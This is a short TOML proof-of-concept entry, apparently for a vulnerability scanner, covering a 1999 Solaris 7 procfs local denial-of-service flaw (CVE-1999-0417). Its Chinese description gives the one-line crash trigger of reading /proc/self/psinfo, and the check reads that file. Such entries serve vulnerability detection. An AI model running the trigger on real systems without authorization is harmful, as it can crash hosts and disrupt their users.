[info]
author = "ave"
description = "Sun Solaris 7.0 的 procfs 在处理 64 位系统调用时存在缺陷，本地攻击者可通过执行 more /proc/self/psinfo 触发系统崩溃。该漏洞需要本地登录权限，仅影响 Solaris 7。"
id = "POC-AVE-1999-0065"
name = "Sun Solaris 7.0 procfs 本地拒绝服务漏洞 PoC"
severity = "low"
tags = ["ave-1999-0065"]
vuln_id = [
    "CVE-1999-0417",
    "AVE-1999-0065",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/proc/self/psinfo"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
regex = ".+"
type = "regex"
